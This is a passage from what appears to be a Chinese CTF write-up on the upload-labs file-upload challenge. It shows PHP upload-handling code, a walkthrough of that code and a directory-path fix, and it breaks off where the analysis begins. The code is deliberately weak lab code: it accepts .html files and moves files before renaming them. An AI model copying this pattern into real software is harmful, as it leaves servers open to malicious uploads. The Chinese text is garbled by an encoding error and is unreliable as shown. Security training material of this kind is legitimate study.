class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyUpload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$imgFileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$status_code</span> <span class="token operator">=</span> <span class="token variable">$u</span><span class="token operator">-&gt;</span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$status_code</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$u</span><span class="token operator">-&gt;</span><span class="token property">cls_upload_dir</span> <span class="token operator">.</span> <span class="token variable">$u</span><span class="token operator">-&gt;</span><span class="token property">cls_file_rename_to</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>              <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æœªçŸ¥é”™è¯¯ï¼'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//myupload.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">MyUpload</span><span class="token punctuation">{</span><span class="token keyword">var</span> <span class="token variable">$cls_upload_dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>         <span class="token comment">// Directory to upload to.</span><span class="token keyword">var</span> <span class="token variable">$cls_filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>           <span class="token comment">// Name of the upload file.</span><span class="token keyword">var</span> <span class="token variable">$cls_tmp_filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>       <span class="token comment">// TMP file Name (tmp name by php).</span>  <span class="token keyword">var</span> <span class="token variable">$cls_max_filesize</span> <span class="token operator">=</span> <span class="token number">33554432</span><span class="token punctuation">;</span> <span class="token comment">// Max file size.</span>  <span class="token keyword">var</span> <span class="token variable">$cls_filesize</span> <span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>            <span class="token comment">// Actual file size.</span>  <span class="token keyword">var</span> <span class="token variable">$cls_file_exists</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token comment">// Set to 1 to check if file exist before upload.</span>  <span class="token keyword">var</span> <span class="token variable">$cls_rename_file</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>         <span class="token comment">// Set to 1 to rename file after upload.</span>  <span class="token keyword">var</span> <span class="token variable">$cls_file_rename_to</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>     <span class="token comment">// New name for the file after upload.</span>  <span class="token keyword">var</span> <span class="token variable">$cls_verbal</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token comment">// Set to 1 to return an a string instead of an error code.</span>  <span class="token keyword">var</span> <span class="token variable">$cls_arr_ext_accepted</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>      <span class="token string double-quoted-string">".doc"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".xls"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".pdf"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".gif"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".zip"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".rar"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".7z"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ppt"</span><span class="token punctuation">,</span>      <span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".xml"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".tiff"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".jpeg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".png"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span>    <span class="token comment">/** upload()   **   ** Method to upload the file.   ** This is the only method to call outside the class.   ** @para String name of directory we upload to   ** @returns void  **/</span>  <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span> <span class="token variable">$dir</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">isUploadedFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setDir</span><span class="token punctuation">(</span> <span class="token variable">$dir</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">checkExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">checkSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// if flag to check if the file exists is set to 1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cls_file_exists</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">checkFileExists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">// if we are here, we are ready to move the file to destination</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token comment">// check if we need to rename the file</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cls_rename_file</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">renameFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token comment">// if we are here, everything worked as planned :)</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"SUCCESS"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="ä»£ç è¯¦è§£"><a href="#ä»£ç è¯¦è§£" class="headerlink" title="ä»£ç è¯¦è§£"></a>ä»£ç è¯¦è§£</h4><h3 id="1-index-php-æ–‡ä»¶é€»è¾‘"><a href="#1-index-php-æ–‡ä»¶é€»è¾‘" class="headerlink" title="1. index.php æ–‡ä»¶é€»è¾‘"></a>1. <code>index.php</code> æ–‡ä»¶é€»è¾‘</h3><p><code>index.php</code> æ˜¯æ–‡ä»¶ä¸Šä¼ çš„ä¸»å…¥å£ï¼Œè´Ÿè´£å¤„ç†ç”¨æˆ·æäº¤çš„æ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå¹¶æ ¹æ®ä¸Šä¼ ç»“æœè¿”å›ç›¸åº”çš„æ¶ˆæ¯ã€‚</p><ul><li><strong>å˜é‡åˆå§‹åŒ–</strong>ï¼š<ul><li><code>$is_upload</code>ï¼šç”¨äºæ ‡è®°æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼Œåˆå§‹å€¼ä¸º <code>false</code>ã€‚</li><li><code>$msg</code>ï¼šç”¨äºå­˜å‚¨ä¸Šä¼ è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ¶ˆæ¯ï¼Œåˆå§‹å€¼ä¸º <code>null</code>ã€‚</li></ul></li><li><strong>æ–‡ä»¶ä¸Šä¼ å¤„ç†</strong>ï¼š<ul><li>å½“ç”¨æˆ·æäº¤è¡¨å•ï¼ˆ<code>$_POST['submit']</code> è¢«è®¾ç½®ï¼‰æ—¶ï¼Œä»£ç ä¼šæ‰§è¡Œæ–‡ä»¶ä¸Šä¼ é€»è¾‘ã€‚</li><li>é¦–å…ˆï¼Œå¼•å…¥ <code>myupload.php</code> æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸­å®šä¹‰äº† <code>MyUpload</code> ç±»ï¼Œç”¨äºå¤„ç†æ–‡ä»¶ä¸Šä¼ çš„å…·ä½“é€»è¾‘ã€‚</li><li>åˆ›å»ºä¸€ä¸ª <code>MyUpload</code> ç±»çš„å®ä¾‹ <code>$u</code>ï¼Œå¹¶ä¼ å…¥ä»¥ä¸‹å‚æ•°ï¼š<ul><li><code>$_FILES['upload_file']['name']</code>ï¼šä¸Šä¼ æ–‡ä»¶çš„åŸå§‹åç§°ã€‚</li><li><code>$_FILES['upload_file']['tmp_name']</code>ï¼šä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ã€‚</li><li><code>$_FILES['upload_file']['size']</code>ï¼šä¸Šä¼ æ–‡ä»¶çš„å¤§å°ã€‚</li><li><code>$imgFileName</code>ï¼šä½¿ç”¨å½“å‰æ—¶é—´æˆ³ç”Ÿæˆçš„æ–‡ä»¶åï¼Œç”¨äºé‡å‘½åæ–‡ä»¶ã€‚</li></ul></li><li>è°ƒç”¨ <code>$u-&gt;upload(UPLOAD_PATH)</code> æ–¹æ³•ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åˆ°æŒ‡å®šçš„ç›®å½• <code>UPLOAD_PATH</code>ã€‚</li></ul></li><li><strong>ä¸Šä¼ ç»“æœå¤„ç†</strong>ï¼š<ul><li><code>upload</code> æ–¹æ³•è¿”å›ä¸€ä¸ªçŠ¶æ€ç ï¼Œ<code>index.php</code> æ ¹æ®è¿™ä¸ªçŠ¶æ€ç æ¥åˆ¤æ–­ä¸Šä¼ æ˜¯å¦æˆåŠŸï¼Œå¹¶è®¾ç½®ç›¸åº”çš„æ¶ˆæ¯ã€‚</li><li>ä½¿ç”¨ <code>switch</code> è¯­å¥å¤„ç†ä¸åŒçš„çŠ¶æ€ç ï¼š<ul><li><strong>çŠ¶æ€ç  1</strong>ï¼šä¸Šä¼ æˆåŠŸï¼Œè®¾ç½® <code>$is_upload</code> ä¸º <code>true</code>ï¼Œå¹¶è·å–ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ã€‚</li><li><strong>çŠ¶æ€ç  2</strong>ï¼šæ–‡ä»¶å·²ä¸Šä¼ ï¼Œä½†æœªé‡å‘½åã€‚</li><li><strong>çŠ¶æ€ç  -1</strong>ï¼šæ–‡ä»¶æ— æ³•ä¸Šä¼ åˆ°ä¸´æ—¶ç›®å½•ã€‚</li><li><strong>çŠ¶æ€ç  -2</strong>ï¼šä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚</li><li><strong>çŠ¶æ€ç  -3</strong>ï¼šæ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ã€‚</li><li><strong>çŠ¶æ€ç  -4</strong>ï¼šæ–‡ä»¶è¿‡å¤§ã€‚</li><li><strong>çŠ¶æ€ç  -5</strong>ï¼šæœåŠ¡å™¨å·²å­˜åœ¨åŒåæ–‡ä»¶ã€‚</li><li><strong>çŠ¶æ€ç  -6</strong>ï¼šæ–‡ä»¶æ— æ³•å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚</li><li><strong>é»˜è®¤</strong>ï¼šæœªçŸ¥é”™è¯¯ã€‚</li></ul></li></ul></li></ul><h3 id="2-myupload-php-æ–‡ä»¶é€»è¾‘"><a href="#2-myupload-php-æ–‡ä»¶é€»è¾‘" class="headerlink" title="2. myupload.php æ–‡ä»¶é€»è¾‘"></a>2. <code>myupload.php</code> æ–‡ä»¶é€»è¾‘</h3><p><code>myupload.php</code> æ–‡ä»¶ä¸­å®šä¹‰äº† <code>MyUpload</code> ç±»ï¼Œè¯¥ç±»å°è£…äº†æ–‡ä»¶ä¸Šä¼ çš„å…·ä½“é€»è¾‘ã€‚</p><ul><li><strong>ç±»å±æ€§</strong>ï¼š<ul><li><code>$cls_arr_ext_accepted</code>ï¼šå…è®¸ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•ååˆ—è¡¨ï¼ŒåŒ…æ‹¬ <code>.doc</code>, <code>.xls</code>, <code>.txt</code>, <code>.pdf</code>, <code>.gif</code>, <code>.jpg</code>, <code>.zip</code>, <code>.rar</code>, <code>.7z</code>, <code>.ppt</code>, <code>.html</code>, <code>.xml</code>, <code>.tiff</code>, <code>.jpeg</code>, <code>.png</code> ç­‰ã€‚</li></ul></li><li><strong><code>upload</code> æ–¹æ³•</strong>ï¼š<ul><li>è¯¥æ–¹æ³•æ˜¯æ–‡ä»¶ä¸Šä¼ çš„æ ¸å¿ƒé€»è¾‘ï¼Œè´Ÿè´£è°ƒç”¨å…¶ä»–æ–¹æ³•æ¥å®Œæˆæ–‡ä»¶ä¸Šä¼ çš„å„ä¸ªæ­¥éª¤ã€‚</li><li><strong>æ­¥éª¤ 1</strong>ï¼šè°ƒç”¨ <code>isUploadedFile()</code> æ–¹æ³•ï¼Œæ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸä¸Šä¼ åˆ°ä¸´æ—¶ç›®å½•ã€‚</li><li><strong>æ­¥éª¤ 2</strong>ï¼šè°ƒç”¨ <code>setDir($dir)</code> æ–¹æ³•ï¼Œè®¾ç½®æ–‡ä»¶ä¸Šä¼ çš„ç›®æ ‡ç›®å½•ï¼Œå¹¶æ£€æŸ¥ç›®å½•æ˜¯å¦å¯å†™ã€‚</li><li><strong>æ­¥éª¤ 3</strong>ï¼šè°ƒç”¨ <code>checkExtension()</code> æ–¹æ³•ï¼Œæ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨å…è®¸çš„åˆ—è¡¨ä¸­ã€‚</li><li><strong>æ­¥éª¤ 4</strong>ï¼šè°ƒç”¨ <code>checkSize()</code> æ–¹æ³•ï¼Œæ£€æŸ¥æ–‡ä»¶å¤§å°æ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚</li><li><strong>æ­¥éª¤ 5</strong>ï¼šå¦‚æœè®¾ç½®äº†æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨çš„æ ‡å¿—ï¼ˆ<code>$cls_file_exists == 1</code>ï¼‰ï¼Œåˆ™è°ƒç”¨ <code>checkFileExists()</code> æ–¹æ³•ï¼Œæ£€æŸ¥ç›®æ ‡ç›®å½•ä¸­æ˜¯å¦å·²å­˜åœ¨åŒåæ–‡ä»¶ã€‚</li><li><strong>æ­¥éª¤ 6</strong>ï¼šè°ƒç”¨ <code>move()</code> æ–¹æ³•ï¼Œå°†æ–‡ä»¶ä»ä¸´æ—¶ç›®å½•ç§»åŠ¨åˆ°ç›®æ ‡ç›®å½•ã€‚</li><li><strong>æ­¥éª¤ 7</strong>ï¼šå¦‚æœè®¾ç½®äº†é‡å‘½åæ–‡ä»¶çš„æ ‡å¿—ï¼ˆ<code>$cls_rename_file == 1</code>ï¼‰ï¼Œåˆ™è°ƒç”¨ <code>renameFile()</code> æ–¹æ³•ï¼Œå¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚</li><li><strong>æ­¥éª¤ 8</strong>ï¼šå¦‚æœæ‰€æœ‰æ­¥éª¤éƒ½æˆåŠŸï¼Œè¿”å› <code>"SUCCESS"</code>ï¼Œå¦åˆ™è¿”å›ç›¸åº”çš„é”™è¯¯ç ã€‚</li></ul></li><li><strong>å…¶ä»–æ–¹æ³•</strong>ï¼š<ul><li><code>isUploadedFile()</code>ï¼šæ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸä¸Šä¼ åˆ°ä¸´æ—¶ç›®å½•ã€‚</li><li><code>setDir($dir)</code>ï¼šè®¾ç½®å¹¶æ£€æŸ¥ä¸Šä¼ ç›®å½•ã€‚</li><li><code>checkExtension()</code>ï¼šæ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åˆæ³•ã€‚</li><li><code>checkSize()</code>ï¼šæ£€æŸ¥æ–‡ä»¶å¤§å°æ˜¯å¦åˆæ³•ã€‚</li><li><code>checkFileExists()</code>ï¼šæ£€æŸ¥ç›®æ ‡ç›®å½•ä¸­æ˜¯å¦å·²å­˜åœ¨åŒåæ–‡ä»¶ã€‚</li><li><code>move()</code>ï¼šå°†æ–‡ä»¶ä»ä¸´æ—¶ç›®å½•ç§»åŠ¨åˆ°ç›®æ ‡ç›®å½•ã€‚</li><li><code>renameFile()</code>ï¼šé‡å‘½åæ–‡ä»¶ã€‚</li><li><code>resultUpload($ret)</code>ï¼šæ ¹æ®ä¸Šä¼ ç»“æœè¿”å›ç›¸åº”çš„çŠ¶æ€ç ã€‚</li></ul></li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li><code>index.php</code> è´Ÿè´£å¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œè°ƒç”¨ <code>MyUpload</code> ç±»è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶æ ¹æ®ä¸Šä¼ ç»“æœè¿”å›ç›¸åº”çš„æ¶ˆæ¯ã€‚</li><li><code>myupload.php</code> ä¸­çš„ <code>MyUpload</code> ç±»å°è£…äº†æ–‡ä»¶ä¸Šä¼ çš„å…·ä½“é€»è¾‘ï¼ŒåŒ…æ‹¬æ–‡ä»¶ç±»å‹æ£€æŸ¥ã€å¤§å°æ£€æŸ¥ã€ç›®å½•æ£€æŸ¥ã€æ–‡ä»¶ç§»åŠ¨å’Œé‡å‘½åç­‰æ“ä½œã€‚</li></ul><p>é€šè¿‡è¿™ç§ç»“æ„åŒ–çš„è®¾è®¡ï¼Œä»£ç å…·æœ‰è‰¯å¥½çš„å¯ç»´æŠ¤æ€§å’Œæ‰©å±•æ€§ï¼Œèƒ½å¤Ÿæœ‰æ•ˆåœ°å¤„ç†æ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­çš„å„ç§æƒ…å†µã€‚</p></blockquote><blockquote><h4 id="å…³å¡æºä»£ç bugï¼š"><a href="#å…³å¡æºä»£ç bugï¼š" class="headerlink" title="å…³å¡æºä»£ç bugï¼š"></a>å…³å¡æºä»£ç bugï¼š</h4><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-31%2010.57.45.png" style="zoom:50%;"><p>ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰æ”¾åœ¨uploadç›®å½•ä¸‹ã€‚</p><p>ä»£ç ä¿®æ”¹ï¼š<code>myupload.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">  <span class="token comment">/** setDir()   **   ** Method to set the directory we will upload to.    ** It will return an error code if the dir is not writable.   ** @para String name of directory we upload to   ** @returns string  **/</span>  <span class="token keyword">function</span> <span class="token function-definition function">setDir</span><span class="token punctuation">(</span> <span class="token variable">$dir</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">is_writable</span><span class="token punctuation">(</span> <span class="token variable">$dir</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token string double-quoted-string">"DIRECTORY_FAILURE"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cls_upload_dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cls_upload_dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-31%2011.01.02.png" style="zoom:50%;"><p>è·¯å¾„ä¿®æ”¹æˆåŠŸã€‚</p></blockquote><p>åˆ†æï¼š 